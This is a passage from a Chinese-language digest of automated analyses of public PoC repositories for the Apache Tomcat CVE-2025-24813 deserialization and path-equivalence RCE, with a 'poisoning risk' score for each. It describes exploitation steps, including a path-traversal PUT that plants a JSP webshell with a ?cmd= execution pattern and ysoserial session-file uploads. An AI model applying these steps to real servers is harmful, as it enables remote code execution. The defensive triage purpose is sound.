2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

